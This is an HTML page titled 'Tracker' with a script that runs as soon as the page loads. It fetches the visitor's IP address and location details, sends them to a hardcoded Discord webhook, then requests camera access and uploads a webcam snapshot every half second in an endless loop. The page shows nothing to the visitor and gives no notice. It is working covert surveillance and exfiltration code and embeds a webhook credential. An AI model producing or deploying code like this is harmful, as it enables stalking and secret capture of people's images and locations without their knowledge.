<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Tracker</title>
</head>
<body>
<script>
const webhook = "https://discord.com/api/webhooks/1385579764592545852/x523eBesGbYlF1EtN7CEwy52A8EpvX9fOGl37Xx63YeS1sEHLAu7_kEif9krCA3bt_lY";

async function getIPInfo() {
  try {
    let res = await fetch('https://ipapi.co/json/');
    if (!res.ok) return null;
    return await res.json();
  } catch {
    return null;
  }
}

async function sendData(imageBlob, ipInfo) {
  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    content: `IP Info: ${ipInfo ? JSON.stringify(ipInfo) : 'Unavailable'}`
  }));
  if (imageBlob) {
    form.append('file', imageBlob, 'capture.png');
  }

  try {
    const response = await fetch(webhook, {
      method: 'POST',
      body: form
    });
    if (!response.ok) {
      console.error('Failed to send webhook:', response.status, response.statusText);
    }
  } catch (e) {
    console.error('Error sending webhook:', e);
  }
}

async function captureLoop() {
  const ipInfo = await getIPInfo();
  await sendData(null, ipInfo); // Send IP info immediately, without image

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({video:true});
  } catch {
    console.error('Camera access denied or unavailable');
    return; // Stop further image capture but IP is already sent
  }

  const video = document.createElement('video');
  video.srcObject = stream;
  await video.play();

  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');

  while (true) {
    await new Promise(r => setTimeout(r, 500));
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));

    await sendData(blob, ipInfo);
  }
}

captureLoop();
</script>
</body>
</html>
